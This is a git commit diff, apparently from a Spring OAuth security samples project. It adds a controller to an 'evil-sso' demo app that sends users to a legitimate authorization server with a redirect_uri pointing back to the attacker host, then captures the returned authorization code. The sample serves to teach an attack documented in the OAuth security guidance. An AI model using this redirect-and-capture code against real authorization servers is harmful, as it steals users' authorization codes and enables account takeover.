e366ef6a00a969c9bbbbdcfc5b862c6bdd2b73a7
Steve Riesenberg <sriesenberg@vmware.com>
2021-08-27 10:22:59 -0500

    Redirect 1
    4.1.  Insufficient Redirect URI Validation
    4.1.1.  Redirect URI Validation Attacks on Authorization Code Grant
    
    This commit demonstrates an attack on an authorization server with no redirect_uri validation whatsoever.

--- samples/boot/oauth-security-topics/evil-sso/src/main/java/com/example/evil/HomeController.java
+++ samples/boot/oauth-security-topics/evil-sso/src/main/java/com/example/evil/HomeController.java
@@ -12,9 +12,14 @@ public class HomeController {
 		return "hello";
 	}
 
-	@GetMapping("/authorize")
+	@GetMapping("/oauth2/authorize")
+	public String authorize() {
+		return "redirect:http://honest-sso:9000/oauth2/authorize?response_type=code&client_id=honest-client&scope=message.read+message.write&state=12345678&redirect_uri=http://evil-sso:8090/authorized";
+	}
+
+	@GetMapping("/authorized")
 	public String authorize(Model model,  @RequestParam String code) {
 		model.addAttribute("code", code);
-		return "authorize";
+		return "authorized";
 	}
 }
